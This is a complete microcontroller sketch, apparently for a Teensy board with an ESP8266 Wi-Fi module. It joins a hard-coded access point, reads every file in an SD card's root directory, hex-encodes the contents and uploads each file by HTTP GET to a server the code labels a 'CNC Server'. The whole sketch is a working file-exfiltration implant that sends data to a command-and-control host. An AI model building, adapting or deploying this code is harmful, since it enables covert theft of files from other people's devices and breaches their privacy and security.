/* WIFI */

#include "ESP8266AT.h"

// Wifi Config
const char* ssid = "Pi_AP";
const char* password = "Raspberry";

// CNC Server
const char* cncIp = "192.168.42.1";
const int cncPort = 80;

// Init Wifi chip object
ESP8266 wifi(Serial1, 57600);

/*
 *  SD
 */

#include <usb_private.h>
#define SD_CS_PIN SS
#include <SPI.h>
#include <SdFat.h>

void sendFile(String filename, String content) {
  uint8_t buffer[64] = {0};
  
  wifi.createTCP(cncIp, cncPort);

  String payloadStr = "GET /upload.php?filename=" + filename + "&content=" + content + " HTTP/1.1\r\nHost: cnc\r\nConnection: close\r\n\r\n";
  char payload[payloadStr.length()+1]; 
  payloadStr.toCharArray(payload, payloadStr.length()+1);
  
  //char* payload = "GET /upload.php?filename=Test.ttt&content=contenu HTTP/1.1\r\nHost: cnc\r\nConnection: close\r\n\r\n";
  //Serial.println(payloadStr);

  wifi.send((const uint8_t*)payload, strlen(payload));
  
  wifi.recv(buffer, sizeof(buffer), 100);
  wifi.releaseTCP(); 
}

void readFiles() {
  // SD chip select pin
  const uint8_t chipSelect = 0;

  // file system object
  SdFat sd;
  SdFile file;
  File myFile;
  String myFileContent;
  unsigned char aChar;
  char EntryName[15];
  
  if (!sd.begin(SD_CS_PIN)) {
    Serial.println("SD init KO");
    return;
  }
  Serial.println("SD init OK");

  // open next file in root.  The volume working directory, vwd, is root
  while (file.openNext(sd.vwd(), O_READ)) {
    //file.printFileSize(&Serial);
    //file.printModifyDateTime(&Serial);
    if (file.isDir()) {
      //Serial.write('/');
    }
    else {
      file.getName(EntryName, 15);
      myFile = sd.open(EntryName);
      myFileContent = "";
      if (myFile) {
        Serial.println(EntryName);
        // read from the file until there's nothing else in it:
        while (myFile.available()) {
          char buff[3];
          
          aChar = myFile.read();
          snprintf(buff, 3, "%02X", aChar);
          myFileContent += String(buff);
          //Serial.write(myFile.read());
        }
        myFile.close();
        sendFile(EntryName, myFileContent);
        }
      file.close();
    }
  }
  Serial.println("All readed");
}


//------------------------------------------------------------------------------
void setup() {
  Serial.begin(115200);
  /* WIFI */
  Serial.println("Wifi init");
  wifi.setOprToStation(); 
  if (wifi.joinAP(ssid, password)) {   
    Serial.println(wifi.getLocalIP().c_str());
  }
  /* SD */
  readFiles();
}

void loop() {}
